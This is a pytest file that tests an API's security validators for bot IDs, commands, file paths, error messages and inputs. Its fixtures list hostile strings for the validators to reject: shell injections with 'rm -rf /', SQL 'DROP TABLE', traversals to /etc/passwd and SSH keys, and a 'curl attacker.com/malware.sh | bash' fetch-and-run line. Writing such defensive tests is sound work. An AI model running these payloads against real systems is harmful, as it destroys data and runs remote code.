"""Security hardening tests for API endpoints."""

import pytest
from deia.services.security_validators import (
    BotIDValidator,
    CommandValidator,
    PathValidator,
    ErrorMessageSanitizer,
    InputSanitizer,
)


class TestBotIDValidator:
    """Test bot ID validation against whitelist."""

    def test_valid_bot_ids(self):
        """Test valid bot ID formats are accepted."""
        valid_ids = ["BOT-001", "BOT-123", "BOT-999"]
        for bot_id in valid_ids:
            assert BotIDValidator.validate(bot_id) == bot_id

    def test_invalid_bot_ids(self):
        """Test invalid bot ID formats are rejected."""
        invalid_ids = [
            "",  # empty
            "bot-001",  # lowercase
            "BOT-01",  # too few digits
            "BOT_001",  # wrong separator
            "BOT001",  # missing separator
            "BOTX001",  # invalid prefix
            "../../etc/passwd",  # path traversal
            "BOT-001; rm -rf /",  # command injection
        ]
        for bot_id in invalid_ids:
            with pytest.raises(ValueError):
                BotIDValidator.validate(bot_id)

    def test_bot_id_is_valid(self):
        """Test is_valid helper method."""
        assert BotIDValidator.is_valid("BOT-001") is True
        assert BotIDValidator.is_valid("invalid") is False
        assert BotIDValidator.is_valid("") is False

    def test_bot_id_length_limits(self):
        """Test bot ID length validation."""
        # Too long
        long_id = "BOT-" + "1" * 100
        with pytest.raises(ValueError):
            BotIDValidator.validate(long_id)

    def test_bot_id_whitespace_handling(self):
        """Test whitespace handling."""
        assert BotIDValidator.validate("  BOT-001  ") == "BOT-001"
        assert BotIDValidator.validate("\tBOT-001\n") == "BOT-001"


class TestCommandValidator:
    """Test command validation and sanitization."""

    def test_valid_commands(self):
        """Test valid commands are accepted."""
        valid_commands = [
            "list files",
            "get status",
            "deploy [version]",
            "run-test",
        ]
        for cmd in valid_commands:
            assert CommandValidator.validate(cmd) == cmd

    def test_command_injection_detection(self):
        """Test command injection attempts are rejected."""
        injection_attempts = [
            "list; rm -rf /",  # semicolon
            "status | grep error",  # pipe
            "launch && stop",  # and operator
            "test `whoami`",  # backticks
            "value=$(cat /etc/passwd)",  # command substitution
            "var=$HOME",  # variable expansion
            "cmd > /tmp/output",  # redirect
            "cmd < /etc/passwd",  # input redirect
        ]
        for cmd in injection_attempts:
            with pytest.raises(ValueError):
                CommandValidator.validate(cmd)

    def test_command_length_limits(self):
        """Test command length validation."""
        long_cmd = "a" * 20000
        with pytest.raises(ValueError):
            CommandValidator.validate(long_cmd)

    def test_command_empty_handling(self):
        """Test empty command rejection."""
        with pytest.raises(ValueError):
            CommandValidator.validate("")
        with pytest.raises(ValueError):
            CommandValidator.validate("   ")


class TestPathValidator:
    """Test path traversal prevention."""

    def test_path_traversal_detection(self):
        """Test path traversal attempts are rejected."""
        traversal_attempts = [
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/passwd",
            "~/.ssh/id_rsa",
            "/tmp/test",
            "%2e%2e/etc/passwd",
            "%252e%252e/etc/passwd",
        ]
        for path in traversal_attempts:
            with pytest.raises(ValueError):
                PathValidator.validate(path)

    def test_valid_paths(self):
        """Test valid paths are accepted."""
        valid_paths = [
            "logs/output.txt",
            "data/file.json",
            "cache/temp",
        ]
        for path in valid_paths:
            assert PathValidator.validate(path) == path


class TestErrorMessageSanitizer:
    """Test error message sanitization."""

    def test_error_message_sanitization(self):
        """Test that error details are hidden."""
        errors = [
            (FileNotFoundError("/home/user/secret/file.txt"), "resource was not found"),
            (PermissionError("Access denied to /etc/passwd"), "Permission denied"),
            (ValueError("Invalid input: special[0]"), "Invalid input"),
        ]
        for error, expected_phrase in errors:
            sanitized = ErrorMessageSanitizer.sanitize(error)
            assert expected_phrase in sanitized
            # Ensure sensitive details not included
            assert "/home/user" not in sanitized
            assert "/etc/passwd" not in sanitized

    def test_unknown_error_handling(self):
        """Test unknown errors get generic message."""
        class CustomError(Exception):
            pass

        error = CustomError("This is a custom error with details")
        sanitized = ErrorMessageSanitizer.sanitize(error)
        assert "An error occurred" in sanitized
        assert "custom error" not in sanitized.lower()


class TestInputSanitizer:
    """Test input sanitization."""

    def test_null_byte_removal(self):
        """Test null bytes are removed."""
        value = "test\x00value"
        sanitized = InputSanitizer.sanitize_json_value(value)
        assert "\x00" not in sanitized
        assert sanitized == "testvalue"

    def test_length_limits(self):
        """Test maximum length enforcement."""
        long_value = "a" * 2000
        with pytest.raises(ValueError):
            InputSanitizer.sanitize_json_value(long_value, max_length=1000)

    def test_whitespace_trimming(self):
        """Test whitespace is trimmed."""
        value = "  test value  "
        sanitized = InputSanitizer.sanitize_json_value(value)
        assert sanitized == "test value"


class TestIntegration:
    """Integration tests for security validation."""

    def test_malicious_bot_launch_attempt(self):
        """Test malicious bot_id in launch request is rejected."""
        malicious_ids = [
            "BOT-001'; DROP TABLE bots; --",
            "BOT-001 && rm -rf /",
            "../../../etc/passwd",
        ]
        for bot_id in malicious_ids:
            assert BotIDValidator.is_valid(bot_id) is False

    def test_command_injection_in_task(self):
        """Test malicious command in task is rejected."""
        malicious_commands = [
            "deploy; curl http://attacker.com/malware.sh | bash",
            "status`whoami`",
            "$(rm -rf /)",
        ]
        for cmd in malicious_commands:
            with pytest.raises(ValueError):
                CommandValidator.validate(cmd)

    def test_path_traversal_in_history(self):
        """Test path traversal in history request is rejected."""
        malicious_paths = [
            "../../sensitive_data",
            "..\\..\\windows",
        ]
        for path in malicious_paths:
            with pytest.raises(ValueError):
                PathValidator.validate(path)
